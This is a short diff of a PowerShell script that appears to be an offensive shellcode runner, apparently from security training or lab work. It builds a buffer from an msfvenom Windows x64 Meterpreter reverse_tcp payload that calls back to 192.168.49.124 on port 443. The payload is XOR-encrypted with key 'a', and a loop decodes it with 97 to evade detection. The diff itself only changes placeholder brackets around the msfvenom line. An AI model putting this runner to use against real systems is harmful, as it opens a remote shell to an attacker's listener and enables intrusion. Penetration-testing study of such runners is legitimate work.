@@ -14,7 +14,7 @@ public static class Kernel32{
 }
 "@
 
-[Byte[]] $buf = msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.124 LPORT=443 -f ps1 --encrypt xor --encrypt-key a
+[Byte[]] $buf = <msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.124 LPORT=443 -f ps1 --encrypt xor --encrypt-key a>
 
 for ($i = 0; $i -lt $buf.Length; $i++) {
     $buf[$i] = [byte]($buf[$i] -bxor 97)
